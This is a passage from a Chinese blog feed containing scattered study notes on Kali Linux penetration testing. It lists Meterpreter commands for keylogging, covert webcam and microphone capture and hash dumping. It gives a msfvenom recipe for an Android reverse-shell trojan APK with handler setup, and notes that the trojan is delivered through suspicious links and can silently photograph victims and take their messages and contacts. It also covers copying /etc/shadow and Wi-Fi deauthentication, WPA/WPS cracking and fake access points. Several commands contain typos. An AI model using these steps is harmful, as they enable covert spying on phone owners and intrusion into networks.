文件管理功能</h3><ul><li>download      下载文件</li><li>edit      编辑文件</li><li>cat       查看文件</li><li>mkdir     创建文件夹</li><li>mv        移动文件</li><li>rm        删除文件</li><li>upload        上传文件</li><li>rmdir     删除文件夹</li></ul><h3 id="8-2-4-网络及系统操作"><a href="#8-2-4-网络及系统操作" class="headerlink" title="8.2.4 网络及系统操作"></a>8.2.4 网络及系统操作</h3><p>网络操作：</p><ul><li>arp       看arp缓冲表</li><li>ifconfig      ip地址网卡</li><li>getproxy      获取代理</li><li>netstat       查看端口链接</li></ul><p>系统操作：</p><ul><li>kill      杀进程</li><li>ps        查看进程表</li><li>reboot    重启电脑</li><li>reg       修改注册表</li><li>shell     获取终端</li><li>shutdown  关闭电脑</li><li>sysinfo   获取系统信息</li></ul><h3 id="8-2-5-用户操作和其他功能"><a href="#8-2-5-用户操作和其他功能" class="headerlink" title="8.2.5 用户操作和其他功能"></a>8.2.5 用户操作和其他功能</h3><ul><li>enumdesktops      窗体</li><li>keyscan_dump      键盘记录—下载</li><li>keyscan_start     键盘记录—开始</li><li>keyscan_stop      键盘记录—停止</li><li>uictl             获取键盘鼠标控制权</li><li>record_mic        声音和音频录制</li><li>webscan_chat      查看摄像头接口</li><li>webscan_list      查看摄像头列表</li><li>webscan_stream          查看摄像头获取（偷窥）</li><li>getsystem     获取管理员权限</li><li>hashdump      下载hash</li><li></li></ul><h2 id="九、安卓渗透"><a href="#九、安卓渗透" class="headerlink" title="九、安卓渗透"></a>九、安卓渗透</h2><h3 id="9-1-实现过程"><a href="#9-1-实现过程" class="headerlink" title="9.1 实现过程"></a>9.1 实现过程</h3><ul><li>9.1 在终端根据自己的ip生成安卓木马<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 <span class="attribute">LHOST</span>=kali的ip <span class="attribute">LPORT</span>=55555 -f apk &gt; test.APK</span><br></pre></td></tr></table></figure></li></ul><p>生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。</p><ul><li><p>9.2 启动Metasplooit</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure></li><li><p>9.3 使用handler</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span></span><br></pre></td></tr></table></figure></li><li><p>9.4 设置安卓木马</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">android</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br></pre></td></tr></table></figure></li><li><p>9.5 查看参数</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></li><li><p>9.6 设置参数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> LHOST <span class="comment">192.168.31.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">HPORT 55555</span></span><br></pre></td></tr></table></figure></li><li><p>9.7 启动监听</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">exploit</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="9-2-常见操作"><a href="#9-2-常见操作" class="headerlink" title="9.2 常见操作"></a>9.2 常见操作</h3><ul><li>search        搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！</li><li>download      下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………）</li><li>webcam_stream        开启手机摄像头</li><li>webcam_snap       启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的）</li><li>check_root    检查ROOT</li><li>dump_calllog  下载电话记录</li><li>dump_contracts    下载短信记录</li><li>geolocat  gps定位</li></ul><h2 id="十、Fluxion"><a href="#十、Fluxion" class="headerlink" title="十、Fluxion"></a>十、Fluxion</h2><h3 id="10-1-Fluxion下载"><a href="#10-1-Fluxion下载" class="headerlink" title="10.1 Fluxion下载"></a>10.1 Fluxion下载</h3><p>下载fluxion源码并进入fluxion且运行：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/FluxionNetwork/fluxion.git  </span><br><span class="line"><span class="keyword">cd</span> fluxion</span><br><span class="line">./fluxion.<span class="keyword">sh</span></span><br><span class="line">若提示没下载fluxion.<span class="keyword">sh</span>，则按照要求下载就行</span><br></pre></td></tr></table></figure></p><h2 id="十一、密码破解"><a href="#十一、密码破解" class="headerlink" title="十一、密码破解"></a>十一、密码破解</h2><ul><li><p>查看kali本机的密码字典</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">locate wordlist</span></span><br></pre></td></tr></table></figure></li><li><p>查看某个密码文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure></li><li><p>拷贝/etc/shadow密码文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp <span class="regexp">/etc/</span>shadow<span class="regexp">/ /</span>root<span class="regexp">/Desktop/</span>hash.list</span><br></pre></td></tr></table></figure></li><li><p>more /etc/login.defs</p></li></ul><h2 id="十二、Hydra"><a href="#十二、Hydra" class="headerlink" title="十二、Hydra"></a>十二、Hydra</h2><p>1</p><h2 id="十三、无线破解"><a href="#十三、无线破解" class="headerlink" title="十三、无线破解"></a>十三、无线破解</h2><p>首先做的三步：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service network-manager stop</span><br><span class="line">airmon-ng<span class="built_in"> check </span>kill</span><br><span class="line">aiarmon-ng start wlan0</span><br></pre></td></tr></table></figure></p><p>开启监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng statr wlan0</span><br></pre></td></tr></table></figure></p><p>监听所有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure></p><p>监听指定bssid：<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon <span class="comment">--bssid XXXX -c 频道 -w wpa(保存名)</span></span><br></pre></td></tr></table></figure></p><p>将连接打掉：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -<span class="number">0</span> <span class="number">2</span> -a <span class="string">[mac地址]</span> -c <span class="string">[客户端mac地址]</span> wlan0mon</span><br></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon <span class="meta">down</span></span><br><span class="line">ifconfig wlan0mon <span class="meta">up</span></span><br></pre></td></tr></table></figure><p>破解：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w <span class="string">[字典]</span> /root/XXX.cap</span><br></pre></td></tr></table></figure></p><p>kali自带常用字典目录：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/john/</span>password.lst</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/wfuzz/</span>wordlist<span class="regexp">/</span></span><br></pre></td></tr></table></figure></p><p>查看字典文件是否含有该密码：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">grep</span> <span class="selector-tag">Password</span> <span class="selector-tag">password</span><span class="selector-class">.lst</span></span><br></pre></td></tr></table></figure></p><p>查看字典有多少行：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat [字典] <span class="string">| wc -l</span></span><br></pre></td></tr></table></figure></p><p>解压文件：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip rockyou<span class="selector-class">.txt</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure></p><hr><p>发现支持wps的AP<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wash -<span class="selector-tag">i</span> wlan0mon</span><br><span class="line">或者是</span><br><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure></p><p>爆破pin码：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -<span class="selector-tag">i</span> wlan0mon -<span class="selector-tag">b</span> [ap mac] -vv -c [信道]</span><br></pre></td></tr></table></figure></p><hr><p>wifite</p><hr><p>伪造wifi：<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng -a <span class="string">[ap_mac]</span> -c <span class="string">[信道]</span> --essid <span class="string">[wifi名字]</span> wlan0mon</span><br></pre></td></tr></table></figure></p><p>```<br>echo [ap(wifi名)] &gt;essid.txt<br>airolib-ng essid_db —import essid essid.txt<br>airolib-ng essid_db —stats<br>airolib-ng essid_db —import password ./names.txt<br>airolib-ng essid_db —batch<br>aircrack-ng -r essid_fb /root/wpa-01.cap</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;以下内容为博主学习《Kali Linux渗透测试的艺术》一书所记录的笔记，有点凌乱、还未整理，有时间再来弄。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、换源并安装open-vm-tools&quot;&gt;&lt;a href=&quot;#一、换源并安装open
      
    
    </summary>
    
      <category term="白帽子" scheme="https://muzimz.cn/categories/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    
    
  </entry>
  
</feed>
